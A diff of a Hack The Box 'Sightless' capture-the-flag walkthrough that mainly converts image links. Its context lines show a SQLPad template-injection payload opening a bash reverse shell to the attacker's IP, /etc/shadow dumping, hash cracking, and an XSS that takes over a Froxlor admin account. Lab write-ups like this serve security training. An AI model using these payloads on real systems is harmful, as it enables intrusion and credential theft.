@@ -40,7 +40,7 @@ Sightless is an easy Linux machine that demonstrates multiple chained exploits:
 ```bash
 ping -c 1 10.10.11.32
 ```
-![[GitHub Documentation/EASY/HTB_Sightless_Writeup/screenshots1/ping.png]]
+![ping](screenshots/ping.png)  
 
 The host responds, confirming it is alive.
 
@@ -60,14 +60,14 @@ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.32 -oG allPorts
 - `-Pn`: Skip host discovery (already confirmed alive)  
 - `-oG`: Output in grepable format
 
-![[GitHub Documentation/EASY/HTB_Sightless_Writeup/screenshots1/allports.png]]
+![allports](screenshots/allports.png)  
 
 Extract the open ports:
 
 ```bash
 extractports allPorts
 ```
-![[GitHub Documentation/EASY/HTB_Sightless_Writeup/screenshots1/extractports.png]]
+![extractports](screenshots/extractports.png)  
 
 ---
 ### 1.3 Targeted Scan
@@ -88,7 +88,7 @@ Let's check the result:
 cat targeted -l java
 ```
 
-![[GitHub Documentation/EASY/HTB_Sightless_Writeup/screenshots1/targeted.png]]
+![targeted](screenshots/targeted.png)  
 
 **Findings:**
 
@@ -100,8 +100,8 @@ cat targeted -l java
 
 Before exploring the website, we analyzed the SSH and HTTP service versions on **Launchpad**.
 
-![[GitHub Documentation/EASY/HTB_Sightless_Writeup/screenshots1/launchpad_openssh.png]]
-![[launpad_niginx.png]]
+![launchpad_openssh](screenshots/launchpad_openssh.png)  
+![launpad_niginx](screenshots/launpad_niginx.png)  
 
 When reviewing the results, it is important to pay attention to the _Uploaded to_ field. In this case, the values differ:  
 `Jammy != Hirsute`
@@ -117,12 +117,12 @@ Continuing with the web enumeration, we discovered several links. One of them wa
 
 Accessing the main website reveals several links. One subdomain is restricted, so we add it to `/etc/hosts`:
 
-![[GitHub Documentation/EASY/HTB_Sightless_Writeup/screenshots1/web.png]]
-![[web_services.png]]
+![web](screenshots/web.png)  
+![web_services](screenshots/web_services.png)
 
 **Start Now** button on SQLPad service redirects to **`sqlpad.sightless.htb`**, which we also add to `/etc/hosts`:
 
-![[web_sqlpad.png]]
+![web_sqlpad](screenshots/web_sqlpad.png)  
 
 SQLPad is an application for executing SQL queries and visualizing results.  
 
@@ -136,7 +136,7 @@ Scan confirmation:
 ```bash
 nmap -p3306 -sC -sV 10.10.11.32
 ```
-![[nmap_p3306.png]]
+![nmap_p3306](screenshots/nmap_p3306.png)  
 
 Open a listener:
 
@@ -145,9 +145,9 @@ nc -nlvp 3306
 ```
 
 Trigger connection test:
-![[web_sqlpad_new_connection_test.png]]
+![web_sqlpad_new_connection_test](screenshots/web_sqlpad_new_connection_test.png)  
 
-![[nc_test_3306.png]]
+![nc_test_3306](screenshots/nc_test_3306.png)  
 
 The connection is received, confirming injection.  
 We found an exploit for **SQLPad v6.10.0 (CVE-2022-0944)**:  
@@ -162,7 +162,7 @@ Payload:
 {{process.mainModule.require('child_process').exec('/bin/bash -c "bash -i >& /dev/tcp/10.10.14.7/443 0>&1"')}}
 ```
 
-![[web_sqlpad_new_connection.png]]
+![web_sqlpad_new_connection](screenshots/web_sqlpad_new_connection.png)  
 
 Open reverse shell listener:
 
@@ -171,7 +171,7 @@ nc -lnvp 443
 ```
 
 On execution:
-![[nc_shell.png]]
+![nc_shell](screenshots/nc_shell.png)  
 
 We obtain a shell inside a **Docker container**.
 
@@ -183,16 +183,16 @@ whoami
 hostname
 ```
 
-![[docker_machine.png]]
+![docker_machine](screenshots/docker_machine.png)  
 
 The hostname confirms a Dockerized environment.  
 Listing users shows limited accounts:
 
-![[docker_machine_permissions.png]]
+![docker_machine_permissions](screenshots/docker_machine_permissions.png)  
 
 Dumping `/etc/shadow`:
 
-![[docker_machine_etc_shadow.png]]
+![docker_machine_etc_shadow](screenshots/docker_machine_etc_shadow.png)  
 
 We found password hashes for **michael** and **root**.  
 
@@ -204,7 +204,7 @@ $6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXN
 
 Identify hash type:
 
-![[GitHub Documentation/EASY/HTB_Sightless_Writeup/screenshots1/hash.png]]
+![hash](screenshots/hash.png)  
 
 It is SHA-512 (`-m 1800`). Crack with Hashcat:
 
@@ -212,7 +212,7 @@ It is SHA-512 (`-m 1800`). Crack with Hashcat:
 hashcat hash /usr/share/wordlists/rockyou.txt -m 1800
 ```
 
-![[hashcat_insaneclownposse.png]]
+![hashcat_insaneclownposse](screenshots/hashcat_insaneclownposse.png)  
 
 Password recovered: **insaneclownposse**
 
@@ -227,7 +227,7 @@ We log in as **michael**:
 ssh michael@10.10.11.32
 ```
 
-![[GitHub Documentation/EASY/HTB_Sightless_Writeup/screenshots1/user_flag.png]]
+![user_flag](screenshots/user_flag.png)  
 
 🏁 **User flag obtained**
 
@@ -238,13 +238,13 @@ ssh michael@10.10.11.32
 
 After logging in as **michael**, we can confirm that we are now inside the main host instead of the Docker container:  
 
-![[ssh_michael_hostname.png]]
+![ssh_michael_hostname](screenshots/ssh_michael_hostname.png)  
 
 The hostname comparison shows that the first system corresponds to the real machine, while the second one was the Docker environment we previously compromised.
 
 As a first step, we attempt to access the `/root` directory:  
 
-![[ssh_michael_root_directory.png]]
+![ssh_michael_root_directory](screenshots/ssh_michael_root_directory.png)  
 
 Access is denied, so we move on to privilege escalation checks.  
 We begin by searching for **SUID binaries**:
@@ -253,7 +253,7 @@ We begin by searching for **SUID binaries**:
 find / -perm -4000 2>/dev/null
 ```
 
-![[ssh_michael_permissions.png]]
+![ssh_michael_permissions](screenshots/ssh_michael_permissions.png)  
 
 No interesting binaries are found. Next, we enumerate **capabilities** assigned to executables:
 
@@ -261,7 +261,7 @@ No interesting binaries are found. Next, we enumerate **capabilities** assigned 
 getcap -r / 2>/dev/null
 ```
 
-![[ssh_michael_capabilities.png]]
+![ssh_michael_capabilities](screenshots/ssh_michael_capabilities.png)  
 
 Again, nothing of interest is discovered.
 
@@ -271,7 +271,7 @@ Checking processes:
 ps -aux
 ```
 
-![[ps_aux.png]]
+![ps_aux](screenshots/ps_aux.png)  
 
 We discover **Apache2** running on **localhost:8080** hosting `admin.sightless.htb`.
 
@@ -281,7 +281,7 @@ Apache2 configuration:
 cat /etc/apache2/sites-enabled/000-default.conf | grep -v '#'
 ```
 
-![[ssh_michael_cat_000_defaultconf.png]]
+![ssh_michael_cat_000_defaultconf](screenshots/ssh_michael_cat_000_defaultconf.png)  
 
 The web root (`/var/www/html/froxlor`) is restricted.  
 
@@ -299,7 +299,7 @@ We then attempt to check the **DocumentRoot** permissions:
 ls -l /var/www/html/froxlor
 ```
 
-![[ssh_michael_froxlor.png]]
+![ssh_michael_froxlor](screenshots/ssh_michael_froxlor.png)  
 
 Access is denied. With the current user, we only have access to `/www`; the directory belongs to the `www-data` user.
 
@@ -309,7 +309,7 @@ From the configuration, we also identify that this Apache2 instance is bound to 
 ss -nltp
 ```
 
-![[ssh_michael_running_process.png]]
+![ssh_michael_running_process](screenshots/ssh_michael_running_process.png)  
 
 At this point, the most effective approach is to use **Local Port Forwarding**. This technique allows us to redirect traffic from our local machine to a service running internally on the victim, usually through an **SSH tunnel**.
 
@@ -328,15 +328,15 @@ Verify:
 lsof -i:8081
 ```
 
-![[lsof.png]]
+![lsof](screenshots/lsof.png)  
 
 Edit `/etc/hosts` to point `admin.sightless.htb` → `127.0.0.1`.
 
-![[etc_hosts.png]]
+![etc_hosts](screenshots/etc_hosts.png)  
 
 Now accessible:
 
-![[web_froxlor.png]]
+![web_froxlor](screenshots/web_froxlor.png)  
 
 ---
 ### 6.3 Froxlor Exploitation (XSS)
@@ -351,11 +351,11 @@ This vulnerability describes a **Cross-Site Scripting (XSS)** issue in the login
 
 First, we download the proof-of-concept payload and inspect it:
 
-![[cat_payload.png]]
+![cat_payload](screenshots/cat_payload.png)  
 
 The content looks obfuscated/encoded, so we open **BurpSuite Decoder** and convert it into a more readable URL-encoded format. Since we may need the original payload for the exploit, we create a separate file called **`payload_decoded`** to analyze its behavior while keeping the encoded one intact:
 
-![[cat_payload_decoded.png]]
+![cat_payload_decoded](screenshots/cat_payload_decoded.png)  
 
 After decoding, we identify the most important section: the **`var url`** parameter, which originally points to `demo.froxlor.org`. To make the exploit work against our target, we modify it to:
 
@@ -363,7 +363,7 @@ After decoding, we identify the most important section: the **`var url`** parame
 
 We apply this change directly in the original (encoded) payload without decoding it before uploading:
 
-![[payload_updated.png]]
+![payload_updated](screenshots/payload_updated.png)  
 
 In summary, we replaced:
 
@@ -374,14 +374,14 @@ In summary, we replaced:
 The next step, according to the exploit instructions, is to intercept a failed login request in **BurpSuite** using invalid credentials and inject our crafted payload into the **username** field.
 We intercept a login request with invalid credentials in BurpSuite and inject the payload into the username field.
 
-![[bs_sending_payload.png]]
+![bs_sending_payload](screenshots/bs_sending_payload.png)  
 
 On reload, we gain access with credentials:
 
 - **User:** abcd  
 - **Pass:** Abcd@@1234  
 
-![[froxlor_login_true.png]]
+![froxlor_login_true](screenshots/froxlor_login_true.png)  
 
 ---
 ### 6.4 FTP Access via Froxlor
@@ -390,7 +390,7 @@ Inside Froxlor, under customers → `web1`, we can reset FTP credentials.
 
 Set new password:
 
-![[web_froxlor_resources_web1_restart_password.png]]
+![web_froxlor_resources_web1_restart_password](screenshots/web_froxlor_resources_web1_restart_password.png)  
 
 Connect via FTP:
 
@@ -398,7 +398,7 @@ Connect via FTP:
 lftp 10.10.11.32
 ```
 
-![[lftp_with_new_password.png]]
+![lftp_with_new_password](screenshots/lftp_with_new_password.png)  
 
 We discover a `Database.kdb` file (KeePass).
 
@@ -411,7 +411,7 @@ Convert KeePass database to hash:
 keepass2john Database.kdb
 ```
 
-![[keepass2john_database.png]]
+![keepass2john_database](screenshots/keepass2john_database.png)  
 
 Crack with Hashcat:
 
@@ -419,7 +419,7 @@ Crack with Hashcat:
 hashcat hash /usr/share/wordlists/rockyou.txt --user -m 13400
 ```
 
-![[hashcat_bulldogs.png]]
+![hashcat_bulldogs](screenshots/hashcat_bulldogs.png)  
 
 Password recovered: **bulldogs**
 
@@ -429,19 +429,19 @@ Open KeePass:
 keepassxc Database.kdb
 ```
 
-![[keepassxc_login.png]]
+![keepassxc_login](screenshots/keepassxc_login.png)  
 
 Import KeePass v1 database:
 
-![[keepassxc_import_datbase.png]]
+![keepassxc_import_datbase](screenshots/keepassxc_import_datbase.png)  
 
 Root credentials are revealed, but password fails:
 
-![[ssh_root_fail.png]]
+![ssh_root_fail](screenshots/ssh_root_fail.png)  
 
 Instead, an **id_rsa private key** is stored:
 
-![[keepassxc_id_rsa.png]]
+![keepassxc_id_rsa](screenshots/keepassxc_id_rsa.png)  
 
 
 ---
@@ -449,7 +449,7 @@ Instead, an **id_rsa private key** is stored:
 
 Using `id_rsa`, we authenticate as root:
 
-![[GitHub Documentation/EASY/HTB_Sightless_Writeup/screenshots1/root_flag.png]]
+![root_flag](screenshots/root_flag.png)  
 
 🏁 **Root flag obtained**
 
